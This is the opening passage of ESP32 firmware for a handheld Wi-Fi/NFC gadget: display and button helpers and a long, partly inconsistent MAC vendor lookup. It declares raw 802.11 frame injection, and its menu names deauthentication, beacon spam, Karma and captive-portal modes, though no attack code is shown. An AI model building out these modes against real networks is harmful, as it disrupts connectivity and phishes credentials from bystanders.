#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <SPI.h>
#include <Wire.h>
#include <WiFi.h>
#include <HTTPClient.h>
#include <NetworkClientSecure.h>
#include <time.h>
#include "esp_wifi.h"
#include <WebServer.h>
#include <DNSServer.h>
#include <Adafruit_PN532.h>

extern "C" esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

#define TFT_CS   15
#define TFT_RST  4
#define TFT_DC   2
#define TFT_BL   16
#define BTN_BACK   26
#define BTN_NEXT   25
#define BTN_SELECT 14
#define HOTSPOT_SSID "ты лох:)"
#define BUZZER_PIN 32

#define PN532_IRQ   -1
#define PN532_RESET -1

#define COL_BG      0x0000
#define COL_ACCENT  0xFC00
#define COL_ACCENT2 0xFD20
#define COL_DIM     0x7BEF
#define COL_TEXT    0xFFFF
#define COL_WARN    0xF800
#define COL_OK      0x07E0

#ifndef ST77XX_LIGHTGREY
#define ST77XX_LIGHTGREY 0xC618
#endif

Adafruit_ST7735 tft(TFT_CS, TFT_DC, TFT_RST);
Adafruit_PN532 nfc(PN532_IRQ, PN532_RESET, &Wire);

const char* WIFI_SSID = "you_WiFi";
const char* WIFI_PASSWORD = "you_password";

enum Screen {
  MAIN, WIFI_MENU, WIFI_SCAN, WIFI_INFO, WIFI_STATUS, WIFI_HOTSPOT,
  BEACON_SPAM, CAPTIVE_PORTAL, SNIFFER, DEAUTH, RADAR, DEAUTH_DETECTOR,
  KARMA, NFC_MENU, NFC_READ, NFC_HISTORY,
  DISPLAY_TEST, WEATHER, INFO, SETTINGS
};
Screen screen = MAIN;
Screen prevScreen = MAIN;
bool screenEntered = true;

int mainItem = 0, wifiItem = 0, networkItem = 0, networkCount = 0;
int settingsItem = 0, nfcItem = 0;
unsigned long lastButton[3] = {0, 0, 0};

float lastLat = 0, lastLon = 0;
String lastCity = "";
struct { bool valid = false; float tempC = 0; int code = 0; } weatherData;

bool apActive = false;
bool buzzerEnabled = true;
int  brightnessLevel = 3;
const int BRIGHTNESS_LEVELS = 5;
const int brightnessValues[BRIGHTNESS_LEVELS] = {30, 90, 150, 210, 255};

bool nfcReady = false;

struct NfcEntry {
  char uid[32];
  char type[24];
  unsigned long time;
};
const int NFC_HISTORY_MAX = 5;
NfcEntry nfcHistory[NFC_HISTORY_MAX];
int nfcHistoryCount = 0;

void clearScreen(uint16_t c = COL_BG);
void text(const char* s, int x, int y, uint16_t c, uint8_t size = 1);
void centerText(const char* s, int y, uint16_t c, uint8_t size = 1);
void message(const char* title, const char* a, const char* b, uint16_t c = COL_TEXT);
void applyBrightness();

void beepTone(uint16_t freq, uint16_t dur) {
  if (!buzzerEnabled) return;
  ledcAttach(BUZZER_PIN, freq, 10);
  ledcWriteTone(BUZZER_PIN, freq);
  delay(dur);
  ledcWriteTone(BUZZER_PIN, 0);
  ledcDetach(BUZZER_PIN);
}
void beepNav()     { beepTone(2000, 25); }
void beepSelect()  { beepTone(2800, 50); }
void beepBack()    { beepTone(1500, 40); }
void beepError()   { beepTone(800, 120); }
void beepSuccess() { beepTone(2500, 60); delay(70); beepTone(3200, 60); }

void applyBrightness() {
  if (brightnessLevel < 0) brightnessLevel = 0;
  if (brightnessLevel >= BRIGHTNESS_LEVELS) brightnessLevel = BRIGHTNESS_LEVELS - 1;
  ledcAttach(TFT_BL, 5000, 8);
  ledcWrite(TFT_BL, brightnessValues[brightnessLevel]);
}

bool backPressed() {
  if (digitalRead(BTN_BACK) == LOW && millis() - lastButton[0] > 160) {
    lastButton[0] = millis(); beepBack(); return true;
  }
  return false;
}
bool nextPressed() {
  if (digitalRead(BTN_NEXT) == LOW && millis() - lastButton[1] > 160) {
    lastButton[1] = millis(); beepNav(); return true;
  }
  return false;
}
bool selectPressed() {
  if (digitalRead(BTN_SELECT) == LOW && millis() - lastButton[2] > 160) {
    lastButton[2] = millis(); beepSelect(); return true;
  }
  return false;
}

void clearScreen(uint16_t c) { tft.fillScreen(c); }

void text(const char* s, int x, int y, uint16_t c, uint8_t size) {
  tft.setTextColor(c); tft.setTextSize(size); tft.setCursor(x, y); tft.print(s);
}
void centerText(const char* s, int y, uint16_t c, uint8_t size) {
  int w = strlen(s) * 6 * size;
  int x = (160 - w) / 2;
  if (x < 0) x = 0;
  text(s, x, y, c, size);
}
void truncateTo(const char* src, char* out, int maxChars) {
  int len = strlen(src);
  if (len <= maxChars) { strcpy(out, src); return; }
  if (maxChars <= 2) { strncpy(out, src, maxChars); out[maxChars] = '\0'; return; }
  strncpy(out, src, maxChars - 2);
  out[maxChars - 2] = '.'; out[maxChars - 1] = '.'; out[maxChars] = '\0';
}

void header(const char* s) {
  tft.fillRect(0, 0, 160, 18, COL_BG);
  text(s, 5, 4, COL_ACCENT);
  tft.drawFastHLine(0, 17, 160, COL_ACCENT);
}

void menuItem(int y, const char* s, bool sel) {
  if (sel) {
    tft.fillRoundRect(3, y - 2, 154, 17, 3, COL_ACCENT);
    text(">", 7, y + 1, COL_BG);
    text(s, 18, y + 1, COL_BG);
  } else {
    text(s, 18, y + 1, COL_ACCENT2);
  }
}

void drawLoading(const char* title, int frame) {
  clearScreen(); header(title);
  const char* dots[4] = {"", ".", "..", "..."};
  char buf[20];
  snprintf(buf, sizeof(buf), "Loading%s", dots[frame % 4]);
  centerText(buf, 55, COL_ACCENT, 2);
}

// ================= OUI LOOKUP =================
const char* ouiVendor(const uint8_t* mac) {
  uint32_t oui = ((uint32_t)mac[0] << 16) | ((uint32_t)mac[1] << 8) | mac[2];

  switch (oui) {
    case 0x000C29: case 0x005056: case 0x000569: return "VMware";
    case 0x080027: return "VirtualBox";
    case 0x001C42: return "Parallels";
    case 0x525400: return "QEMU";
    case 0x00163E: return "Xensource";
  }

  switch (mac[0]) {
    case 0x00:
      if (mac[1] == 0x1B || mac[1] == 0x23 || mac[1] == 0x25 || mac[1] == 0x26 || mac[1] == 0x50) return "Apple";
      if (mac[1] == 0x0A || mac[1] == 0x0D || mac[1] == 0x0E || mac[1] == 0x0F ||
          mac[1] == 0x10 || mac[1] == 0x11 || mac[1] == 0x12 || mac[1] == 0x13 ||
          mac[1] == 0x14 || mac[1] == 0x1A || mac[1] == 0x1E || mac[1] == 0x22 ||
          mac[1] == 0x24 || mac[1] == 0x30 || mac[1] == 0x60 || mac[1] == 0x90 ||
          mac[1] == 0xB0 || mac[1] == 0xE0) return "Cisco";
      if (mac[1] == 0x15 || mac[1] == 0x16 || mac[1] == 0x19 || mac[1] == 0x1D ||
          mac[1] == 0x13 || mac[1] == 0x21 || mac[1] == 0x36 || mac[1] == 0x3B ||
          mac[1] == 0x4C || mac[1] == 0x55 || mac[1] == 0x61) return "Sony";
      return "Unknown";
    case 0x04:
      if (mac[1] == 0x0C || mac[1] == 0x18 || mac[1] == 0x4E || mac[1] == 0x5E ||
          mac[1] == 0x7B || mac[1] == 0x8D || mac[1] == 0xB1 || mac[1] == 0xBD ||
          mac[1] == 0xD6 || mac[1] == 0xE6) return "Google";
      return "Unknown";
    case 0x08: if (mac[1] == 0x00) return "Apple"; return "Unknown";
    case 0x0C: if (mac[1] == 0x30) return "Apple"; return "Unknown";
    case 0x10: if (mac[1] == 0x40 || mac[1] == 0x9A || mac[1] == 0xDD) return "Apple"; return "Unknown";
    case 0x18: if (mac[1] == 0x65 || mac[1] == 0xAF || mac[1] == 0xE7) return "Apple"; return "Unknown";
    case 0x1C: if (mac[1] == 0xAB || mac[1] == 0xE2) return "Apple"; return "Unknown";
    case 0x20: if (mac[1] == 0x78 || mac[1] == 0x7B || mac[1] == 0x8D) return "Apple"; return "Unknown";
    case 0x24: if (mac[1] == 0x1E || mac[1] == 0xA0 || mac[1] == 0xF0) return "Apple"; return "Unknown";
    case 0x28:
      if (mac[1] == 0x0B || mac[1] == 0x37 || mac[1] == 0x6A || mac[1] == 0xCF ||
          mac[1] == 0xE1 || mac[1] == 0xE7 || mac[1] == 0xF0) return "Apple";
      return "Unknown";
    case 0x2C: if (mac[1] == 0x1F || mac[1] == 0x54) return "Apple"; return "Unknown";
    case 0x30: if (mac[1] == 0x90) return "Apple"; return "Unknown";
    case 0x34:
      if (mac[1] == 0x08 || mac[1] == 0x12 || mac[1] == 0x15 || mac[1] == 0xC9) return "Apple";
      if (mac[1] == 0x02) return "Intel";
      return "Unknown";
    case 0x38: if (mac[1] == 0xC9) return "Apple"; return "Unknown";
    case 0x3C:
      if (mac[1] == 0x07 || mac[1] == 0xAB) return "Apple";
      if (mac[1] == 0x95) return "Intel";
      if (mac[1] == 0x5A) return "Google";
      return "Unknown";
    case 0x40:
      if (mac[1] == 0x6C || mac[1] == 0x98 || mac[1] == 0xD3) return "Apple";
      if (mac[1] == 0x25) return "Intel";
      return "Unknown";
    case 0x44:
      if (mac[1] == 0x00 || mac[1] == 0x2A || mac[1] == 0xD9) return "Apple";
      if (mac[1] == 0x85) return "Intel";
      return "Unknown";
    case 0x48:
      if (mac[1] == 0x43 || mac[1] == 0x60 || mac[1] == 0xD0) return "Apple";
      if (mac[1] == 0x51) return "Intel";
      return "Unknown";
    case 0x4C:
      if (mac[1] == 0x57) return "Apple";
      if (mac[1] == 0x79) return "Intel";
      return "Unknown";
    case 0x50:
      if (mac[1] == 0xEA) return "Apple";
      if (mac[1] == 0x76) return "Intel";
      return "Unknown";
    case 0x54:
      if (mac[1] == 0x26 || mac[1] == 0x72 || mac[1] == 0x9F) return "Apple";
      if (mac[1] == 0x27) return "Intel";
      if (mac[1] == 0x60) return "Google";
      return "Unknown";
    case 0x58:
      if (mac[1] == 0x55 || mac[1] == 0xB0) return "Apple";
      if (mac[1] == 0x91) return "Intel";
      return "Unknown";
    case 0x5C:
      if (mac[1] == 0x59 || mac[1] == 0x95 || mac[1] == 0x97) return "Apple";
      if (mac[1] == 0xE0) return "Intel";
      return "Unknown";
    case 0x60:
      if (mac[1] == 0x03 || mac[1] == 0x33 || mac[1] == 0x69 || mac[1] == 0x8C ||
          mac[1] == 0x92 || mac[1] == 0xFB) return "Apple";
      if (mac[1] == 0x36 || mac[1] == 0x67) return "Intel";
      return "Unknown";
    case 0x64:
      if (mac[1] == 0x20 || mac[1] == 0x76 || mac[1] == 0x9B || mac[1] == 0xB9) return "Apple";
      if (mac[1] == 0x80) return "Intel";
      return "Unknown";
    case 0x68:
      if (mac[1] == 0x96 || mac[1] == 0x9C || mac[1] == 0xAB || mac[1] == 0xAE || mac[1] == 0xDB) return "Apple";
      if (mac[1] == 0x05) return "Intel";
      return "Unknown";
    case 0x6C:
      if (mac[1] == 0x40 || mac[1] == 0x70 || mac[1] == 0x72 || mac[1] == 0x8D ||
          mac[1] == 0x94 || mac[1] == 0xAB) return "Apple";
      if (mac[1] == 0x88) return "Intel";
      return "Unknown";
    case 0x70:
      if (mac[1] == 0x11 || mac[1] == 0x3E || mac[1] == 0x48 || mac[1] == 0x56 ||
          mac[1] == 0x73 || mac[1] == 0x81 || mac[1] == 0xCD || mac[1] == 0xDE ||
          mac[1] == 0xEC || mac[1] == 0xF0) return "Apple";
      if (mac[1] == 0x1C) return "Intel";
      return "Unknown";
    case 0x74:
      if (mac[1] == 0x1B || mac[1] == 0x8D || mac[1] == 0xE1 || mac[1] == 0xE2) return "Apple";
      if (mac[1] == 0xE5) return "Intel";
      return "Unknown";
    case 0x78:
      if (mac[1] == 0x31 || mac[1] == 0x6C || mac[1] == 0x7D || mac[1] == 0x88 ||
          mac[1] == 0x9F || mac[1] == 0xCA) return "Apple";
      if (mac[1] == 0x92) return "Intel";
      return "Unknown";
    case 0x7C:
      if (mac[1] == 0x11 || mac[1] == 0x6D || mac[1] == 0xC3 || mac[1] == 0xD1 || mac[1] == 0xF0) return "Apple";
      if (mac[1] == 0x5C) return "Intel";
      return "Unknown";
    case 0x80:
      if (mac[1] == 0x00 || mac[1] == 0x92 || mac[1] == 0xB0 || mac[1] == 0xEA) return "Apple";
      if (mac[1] == 0x19) return "Intel";
      return "Unknown";
    case 0x84:
      if (mac[1] == 0x29 || mac[1] == 0x38 || mac[1] == 0x85 || mac[1] == 0xB1 || mac[1] == 0xFC) return "Apple";
      if (mac[1] == 0x3A) return "Intel";
      return "Unknown";
    case 0x88:
      if (mac[1] == 0x19 || mac[1] == 0x63 || mac[1] == 0x66 || mac[1] == 0xE9) return "Apple";
      if (mac[1] == 0x53) return "Intel";
      return "Unknown";
    case 0x8C:
      if (mac[1] == 0x29 || mac[1] == 0x58 || mac[1] == 0x7C || mac[1] == 0x8E || mac[1] == 0xFA) return "Apple";
      if (mac[1] == 0x16) return "Intel";
      return "Unknown";
    case 0x90:
      if (mac[1] == 0x27 || mac[1] == 0x60 || mac[1] == 0x72 || mac[1] == 0x84 ||
          mac[1] == 0xB2 || mac[1] == 0xDD) return "Apple";
      if (mac[1] == 0x49) return "Intel";
      return "Unknown";
    case 0x94:
      if (mac[1] == 0x16 || mac[1] == 0xBF || mac[1] == 0xE6 || mac[1] == 0xF6) return "Apple";
      if (mac[1] == 0x65) return "Intel";
      if (mac[1] == 0xEB) return "Google";
      return "Unknown";
    case 0x98:
      if (mac[1] == 0x03 || mac[1] == 0x5B || mac[1] == 0xB8 || mac[1] == 0xD6 ||
          mac[1] == 0xF5 || mac[1] == 0xFE) return "Apple";
      if (mac[1] == 0x4F) return "Intel";
      return "Unknown";
    case 0x9C:
      if (mac[1] == 0x04 || mac[1] == 0x20 || mac[1] == 0x35 || mac[1] == 0x4F ||
          mac[1] == 0xF4 || mac[1] == 0xFC) return "Apple";
      if (mac[1] == 0xB6) return "Intel";
      return "Unknown";
    case 0xA0:
      if (mac[1] == 0x99 || mac[1] == 0xD1 || mac[1] == 0xED) return "Apple";
      if (mac[1] == 0x36) return "Intel";
      return "Unknown";
    case 0xA4:
      if (mac[1] == 0x5E || mac[1] == 0x83 || mac[1] == 0xB9 || mac[1] == 0xC3 || mac[1] == 0xD1) return "Apple";
      if (mac[1] == 0xF4) return "Xiaomi";
      if (mac[1] == 0x02) return "Intel";
      return "Unknown";
    case 0xA8:
      if (mac[1] == 0x20 || mac[1] == 0x5F || mac[1] == 0x66 || mac[1] == 0x8C ||
          mac[1] == 0x96 || mac[1] == 0xBB || mac[1] == 0xFA) return "Apple";
      if (mac[1] == 0x6B) return "Intel";
      return "Unknown";
    case 0xAC:
      if (mac[1] == 0x29 || mac[1] == 0x3C || mac[1] == 0x61 || mac[1] == 0xBC ||
          mac[1] == 0xCF || mac[1] == 0xE4 || mac[1] == 0xFD) return "Apple";
      if (mac[1] == 0x74) return "Intel";
      return "Unknown";
    case 0xB0:
      if (mac[1] == 0x34 || mac[1] == 0x65 || mac[1] == 0x9F) return "Apple";
      if (mac[1] == 0x6E) return "Intel";
      return "Unknown";
    case 0xB4:
      if (mac[1] == 0x18 || mac[1] == 0xF0) return "Apple";
      if (mac[1] == 0x4B) return "Xiaomi";
      if (mac[1] == 0x6B) return "Intel";
      return "Unknown";
    case 0xB8:
      if (mac[1] == 0x17 || mac[1] == 0x41 || mac[1] == 0x44 || mac[1] == 0x63 ||
          mac[1] == 0x8F || mac[1] == 0xC9 || mac[1] == 0xE3 || mac[1] == 0xFF) return "Apple";
      if (mac[1] == 0x08) return "Intel";
      return "Unknown";
    case 0xBC:
      if (mac[1] == 0x52 || mac[1] == 0x67 || mac[1] == 0x92 || mac[1] == 0x9F || mac[1] == 0xA9) return "Apple";
      if (mac[1] == 0x0F) return "Intel";
      return "Unknown";
    case 0xC0:
      if (mac[1] == 0x1A || mac[1] == 0x63 || mac[1] == 0x84 || mac[1] == 0x9F ||
          mac[1] == 0xCE || mac[1] == 0xF2) return "Apple";
      if (mac[1] == 0x3F) return "Intel";
      return "Unknown";
    case 0xC4:
      if (mac[1] == 0x2C || mac[1] == 0xB3) return "Apple";
      if (mac[1] == 0x8E) return "Intel";
      return "Unknown";
    case 0xC8:
      if (mac[1] == 0x2A || mac[1] == 0x33 || mac[1] == 0x6D || mac[1] == 0x85 ||
          mac[1] == 0xB5 || mac[1] == 0xBC || mac[1] == 0xD0 || mac[1] == 0xE0 ||
          mac[1] == 0xF6) return "Apple";
      if (mac[1] == 0x21) return "Intel";
      return "Unknown";
    case 0xCC:
      if (mac[1] == 0x08 || mac[1] == 0x25 || mac[1] == 0x29 || mac[1] == 0x44 ||
          mac[1] == 0x78 || mac[1] == 0xC7) return "Apple";
      if (mac[1] == 0x2F) return "Intel";
      return "Unknown";
    case 0xD0:
      if (mac[1] == 0x23 || mac[1] == 0x25 || mac[1] == 0x81 || mac[1] == 0xE1) return "Apple";
      if (mac[1] == 0x57) return "Intel";
      return "Unknown";
    case 0xD4:
      if (mac[1] == 0x61 || mac[1] == 0x9B || mac[1] == 0xDC || mac[1] == 0xF4) return "Apple";
      if (mac[1] == 0x25) return "Intel";
      return "Unknown";
    case 0xD8:
      if (mac[1] == 0x00 || mac[1] == 0x1D || mac[1] == 0x30 || mac[1] == 0x96 ||
          mac[1] == 0x9B || mac[1] == 0xA2 || mac[1] == 0xBB || mac[1] == 0xCF) return "Apple";
      if (mac[1] == 0xFC) return "Intel";
      return "Unknown";
    case 0xDC:
      if (mac[1] == 0x2B || mac[1] == 0x37 || mac[1] == 0x9B || mac[1] == 0xA4 || mac[1] == 0xD9) return "Apple";
      if (mac[1] == 0x53) return "Intel";
      return "Unknown";
    case 0xE0:
      if (mac[1] == 0x5F || mac[1] == 0xAC || mac[1] == 0xB9 || mac[1] == 0xF8) return "Apple";
      if (mac[1] == 0x94) return "Intel";
      return "Unknown";
    case 0xE4:
      if (mac[1] == 0x25 || mac[1] == 0x8F || mac[1] == 0x9A || mac[1] == 0xCE) return "Apple";
      if (mac[1] == 0xA4) return "Intel";
      return "Unknown";
    case 0xE8:
      if (mac[1] == 0x04 || mac[1] == 0x06 || mac[1] == 0x8F || mac[1] == 0xB2) return "Apple";
      if (mac[1] == 0x2A) return "Intel";
      return "Unknown";
    case 0xEC:
      if (mac[1] == 0x35 || mac[1] == 0x85 || mac[1] == 0xAD) return "Apple";
      if (mac[1] == 0xF4) return "Intel";
      return "Unknown";
    case 0xF0:
      if (mac[1] == 0x18 || mac[1] == 0x98 || mac[1] == 0x99 || mac[1] == 0xB0 ||
          mac[1] == 0xC1 || mac[1] == 0xCB || mac[1] == 0xD1 || mac[1] == 0xDB ||
          mac[1] == 0xF3) return "Apple";
      if (mac[1] == 0x9E) return "Intel";
      return "Unknown";
    case 0xF4:
      if (mac[1] == 0x0F || mac[1] == 0x1C || mac[1] == 0x31 || mac[1] == 0x37 ||
          mac[1] == 0x5B || mac[1] == 0xF5) return "Apple";
      if (mac[1] == 0x8C) return "Intel";
      if (mac[1] == 0xF5) return "Google";
      return "Unknown";
    case 0xF8:
      if (mac[1] == 0x1E || mac[1] == 0x27 || mac[1] == 0x38 || mac[1] == 0xFF) return "Apple";
      if (mac[1] == 0x16) return "Intel";
      return "Unknown";
    case 0xFC:
      if (mac[1] == 0x25 || mac[1] == 0xC7 || mac[1] == 0xD8 || mac[1] == 0xE3 || mac[1] == 0xF8) return "Apple";
      if (mac[1] == 0xF8) return "Intel";
      return "Unknown";
  }

  if (mac[0] == 0xDA && mac[1] == 0xA1) return "Google";

  if ((mac[0] == 0x00 && mac[1] == 0x9E && mac[2] == 0xC1) ||
      (mac[0] == 0x04 && mac[1] == 0xCF) ||
      (mac[0] == 0x0C && mac[1] == 0x1D) ||
      (mac[0] == 0x10 && mac[1] == 0x2A) ||
      (mac[0] == 0x14 && mac[1] == 0xF6) ||
      (mac[0] == 0x18 && mac[1] == 0x59) ||
      (mac[0] == 0x20 && mac[1] == 0x47) ||
      (mac[0] == 0x28 && mac[1] == 0x6C) ||
      (mac[0] == 0x2C && mac[1] == 0xF0) ||
      (mac[0] == 0x34 && mac[1] == 0x80) ||
      (mac[0] == 0x38 && mac[1] == 0xA4) ||
      (mac[0] == 0x3C && mac[1] == 0xBD) ||
      (mac[0] == 0x40 && mac[1] == 0x31) ||
      (mac[0] == 0x44 && mac[1] == 0x23) ||
      (mac[0] == 0x48 && mac[1] == 0x6B) ||
      (mac[0] == 0x4C && mac[1] == 0x49) ||
      (mac[0] == 0x54 && mac[1] == 0x48) ||
      (mac[0] == 0x58 && mac[1] == 0x44) ||
      (mac[0] == 0x5C && mac[1] == 0x02) ||
      (mac[0] == 0x60 && mac[1] == 0xAB) ||
      (mac[0] == 0x64 && mac[1] == 0x09) ||
      (mac[0] == 0x64 && mac[1] == 0xB4) ||
      (mac[0] == 0x68 && mac[1] == 0xAB) ||
      (mac[0] == 0x6C && mac[1] == 0xF1) ||
      (mac[0] == 0x70 && mac[1] == 0x8B) ||
      (mac[0] == 0x74 && mac[1] == 0x23) ||
      (mac[0] == 0x78 && mac[1] == 0x02) ||
      (mac[0] == 0x78 && mac[1] == 0x11) ||
      (mac[0] == 0x7C && mac[1] == 0x1D) ||
      (mac[0] == 0x80 && mac[1] == 0xAD) ||
      (mac[0] == 0x84 && mac[1] == 0x0D) ||
      (mac[0] == 0x88 && mac[1] == 0xC3) ||
      (mac[0] == 0x8C && mac[1] == 0xBE) ||
      (mac[0] == 0x90 && mac[1] == 0x78) ||
      (mac[0] == 0x94 && mac[1] == 0x87) ||
      (mac[0] == 0x98 && mac[1] == 0xFA) ||
      (mac[0] == 0x9C && mac[1] == 0x99) ||
      (mac[0] == 0xA0 && mac[1] == 0x86) ||
      (mac[0] == 0xA4 && mac[1] == 0xDA) ||
      (mac[0] == 0xA8 && mac[1] == 0x9C) ||
      (mac[0] == 0xAC && mac[1] == 0xC1) ||
      (mac[0] == 0xB0 && mac[1] == 0xE2) ||
      (mac[0] == 0xB4 && mac[1] == 0x0B) ||
      (mac[0] == 0xB8 && mac[1] == 0x88) ||
      (mac[0] == 0xBC && mac[1] == 0x44) ||
      (mac[0] == 0xC0 && mac[1] == 0xEE) ||
      (mac[0] == 0xC4 && mac[1] == 0x0B) ||
      (mac[0] == 0xC8 && mac[1] == 0x47) ||
      (mac[0] == 0xCC && mac[1] == 0x2D) ||
      (mac[0] == 0xD4 && mac[1] == 0x97) ||
      (mac[0] == 0xD8 && mac[1] == 0x32) ||
      (mac[0] == 0xDC && mac[1] == 0x44) ||
      (mac[0] == 0xE0 && mac[1] == 0xDC) ||
      (mac[0] == 0xE4 && mac[1] == 0x46) ||
      (mac[0] == 0xE8 && mac[1] == 0xAB) ||
      (mac[0] == 0xEC && mac[1] == 0xFA) ||
      (mac[0] == 0xF0 && mac[1] == 0xB4) ||
      (mac[0] == 0xF4 && mac[1] == 0x8B) ||
      (mac[0] == 0xF8 && mac[1] == 0xA4) ||
      (mac[0] == 0xFC && mac[1] == 0x64)) return "Xiaomi";

  if ((mac[0] == 0x00 && mac[1] == 0x1A && mac[2] == 0x79) ||
      (mac[0] == 0x00 && mac[1] == 0x21 && mac[2] == 0x19) ||
      (mac[0] == 0x04 && mac[1] == 0x18) ||
      (mac[0] == 0x08 && mac[1] == 0x37) ||
      (mac[0] == 0x0C && mac[1] == 0x71) ||
      (mac[0] == 0x10 && mac[1] == 0xD5) ||
      (mac[0] == 0x14 && mac[1] == 0x49) ||
      (mac[0] == 0x18 && mac[1] == 0x3A) ||
      (mac[0] == 0x1C && mac[1] == 0x5A) ||
      (mac[0] == 0x20 && mac[1] == 0x13) ||
      (mac[0] == 0x24 && mac[1] == 0x4B) ||
      (mac[0] == 0x28 && mac[1] == 0x39) ||
      (mac[0] == 0x2C && mac[1] == 0x44) ||
      (mac[0] == 0x30 && mac[1] == 0x19) ||
      (mac[0] == 0x34 && mac[1] == 0x23) ||
      (mac[0] == 0x38 && mac[1] == 0xAA) ||
      (mac[0] == 0x3C && mac[1] == 0x5A) ||
      (mac[0] == 0x40 && mac[1] == 0x0E) ||
      (mac[0] == 0x44 && mac[1] == 0x4E) ||
      (mac[0] == 0x48 && mac[1] == 0x13) ||
      (mac[0] == 0x4C && mac[1] == 0x3C) ||
      (mac[0] == 0x50 && mac[1] == 0x32) ||
      (mac[0] == 0x54 && mac[1] == 0x92) ||
      (mac[0] == 0x58 && mac[1] == 0x21) ||
      (mac[0] == 0x5C && mac[1] == 0x0A) ||
      (mac[0] == 0x60 && mac[1] == 0x6B) ||
      (mac[0] == 0x64 && mac[1] == 0xB8) ||
      (mac[0] == 0x68 && mac[1] == 0xEB) ||
      (mac[0] == 0x6C && mac[1] == 0x2F) ||
      (mac[0] == 0x70 && mac[1] == 0xF9) ||
      (mac[0] == 0x74 && mac[1] == 0x45) ||
      (mac[0] == 0x78 && mac[1] == 0x1F) ||
      (mac[0] == 0x7C && mac[1] == 0x61) ||
      (mac[0] == 0x80 && mac[1] == 0x57) ||
      (mac[0] == 0x84 && mac[1] == 0x25) ||
      (mac[0] == 0x88 && mac[1] == 0x32) ||
      (mac[0] == 0x8C && mac[1] == 0x77) ||
      (mac[0] == 0x90 && mac[1] == 0x18) ||
      (mac[0] == 0x94 && mac[1] == 0x35) ||
      (mac[0] == 0x98 && mac[1] == 0x0C) ||
      (mac[0] == 0x9C && mac[1] == 0x02) ||
      (mac[0] == 0xA0 && mac[1] == 0x21) ||
      (mac[0] == 0xA4 && mac[1] == 0xEB) ||
      (mac[0] == 0xA8 && mac[1] == 0x06) ||
      (mac[0] == 0xAC && mac[1] == 0x5F) ||
      (mac[0] == 0xB0 && mac[1] == 0xDF) ||
      (mac[0] == 0xB4 && mac[1] == 0x79) ||
      (mac[0] == 0xB8 && mac[1] == 0x5E) ||
      (mac[0] == 0xBC && mac[1] == 0x14) ||
      (mac[0] == 0xC0 && mac[1] == 0xBD) ||
      (mac[0] == 0xC4 && mac[1] == 0x57) ||
      (mac[0] == 0xC8 && mac[1] == 0x19) ||
      (mac[0] == 0xCC && mac[1] == 0x07) ||
      (mac[0] == 0xD0 && mac[1] == 0x22) ||
      (mac[0] == 0xD4 && mac[1] == 0x87) ||
      (mac[0] == 0xD8 && mac[1] == 0x57) ||
      (mac[0] == 0xDC && mac[1] == 0x71) ||
      (mac[0] == 0xE0 && mac[1] == 0x99) ||
      (mac[0] == 0xE4 && mac[1] == 0x40) ||
      (mac[0] == 0xE8 && mac[1] == 0x03) ||
      (mac[0] == 0xEC && mac[1] == 0x1F) ||
      (mac[0] == 0xF0 && mac[1] == 0x25) ||
      (mac[0] == 0xF4 && mac[1] == 0x9F) ||
      (mac[0] == 0xF8 && mac[1] == 0x04) ||
      (mac[0] == 0xFC && mac[1] == 0xA1)) return "Samsung";

  if ((mac[0] == 0x00 && mac[1] == 0x1A && mac[2] == 0x0B) ||
      (mac[0] == 0x00 && mac[1] == 0x1A && mac[2] == 0x1A) ||
      (mac[0] == 0x00 && mac[1] == 0x21 && mac[2] == 0x08) ||
      (mac[0] == 0x08 && mac[1] == 0x95) ||
      (mac[0] == 0x0C && mac[1] == 0x58) ||
      (mac[0] == 0x10 && mac[1] == 0x52) ||
      (mac[0] == 0x18 && mac[1] == 0xFE) ||
      (mac[0] == 0x1C && mac[1] == 0x59) ||
      (mac[0] == 0x20 && mac[1] == 0x71) ||
      (mac[0] == 0x24 && mac[1] == 0x62) ||
      (mac[0] == 0x2C && mac[1] == 0x3A) ||
      (mac[0] == 0x30 && mac[1] == 0xAE) ||
      (mac[0] == 0x34 && mac[1] == 0xAB) ||
      (mac[0] == 0x3C && mac[1] == 0x61) ||
      (mac[0] == 0x3C && mac[1] == 0x71) ||
      (mac[0] == 0x40 && mac[1] == 0x91) ||
      (mac[0] == 0x44 && mac[1] == 0x17) ||
      (mac[0] == 0x48 && mac[1] == 0x3F) ||
      (mac[0] == 0x4C && mac[1] == 0x11) ||
      (mac[0] == 0x50 && mac[1] == 0x02) ||
      (mac[0] == 0x54 && mac[1] == 0x5A) ||
      (mac[0] == 0x58 && mac[1] == 0xBF) ||
      (mac[0] == 0x5C && mac[1] == 0xCF) ||
      (mac[0] == 0x60 && mac[1] == 0x01) ||
      (mac[0] == 0x60 && mac[1] == 0x55) ||
      (mac[0] == 0x68 && mac[1] == 0xC6) ||
      (mac[0] == 0x6C && mac[1] == 0xC6) ||
      (mac[0] == 0x70 && mac[1] == 0x03) ||
      (mac[0] == 0x74 && mac[1] == 0x4D) ||
      (mac[0] == 0x78 && mac[1] == 0x21) ||
      (mac[0] == 0x7C && mac[1] == 0x87) ||
      (mac[0] == 0x7C && mac[1] == 0xDF) ||
      (mac[0] == 0x80 && mac[1] == 0x64) ||
      (mac[0] == 0x84 && mac[1] == 0xF3) ||
      (mac[0] == 0x84 && mac[1] == 0xCC) ||
      (mac[0] == 0x8C && mac[1] == 0xAA) ||
      (mac[0] == 0x90 && mac[1] == 0x38) ||
      (mac[0] == 0x94 && mac[1] == 0xB9) ||
      (mac[0] == 0x98 && mac[1] == 0xF4) ||
      (mac[0] == 0x9C && mac[1] == 0x9C) ||
      (mac[0] == 0xA0 && mac[1] == 0x20) ||
      (mac[0] == 0xA4 && mac[1] == 0x7B) ||
      (mac[0] == 0xA4 && mac[1] == 0xCF) ||
      (mac[0] == 0xA8 && mac[1] == 0x03) ||
      (mac[0] == 0xAC && mac[1] == 0x67) ||
      (mac[0] == 0xB0 && mac[1] == 0xA7) ||
      (mac[0] == 0xB4 && mac[1] == 0xE6) ||
      (mac[0] == 0xB8 && mac[1] == 0xD6) ||
      (mac[0] == 0xBC && mac[1] == 0xDD) ||
      (mac[0] == 0xC0 && mac[1] == 0x49) ||
      (mac[0] == 0xC4 && mac[1] == 0x4F) ||
      (mac[0] == 0xC8 && mac[1] == 0x2B) ||
      (mac[0] == 0xCC && mac[1] == 0x50) ||
      (mac[0] == 0xD0 && mac[1] == 0x93) ||
      (mac[0] == 0xD4 && mac[1] == 0x8A) ||
      (mac[0] == 0xD8 && mac[1] == 0xA0) ||
      (mac[0] == 0xD8 && mac[1] == 0xBF) ||
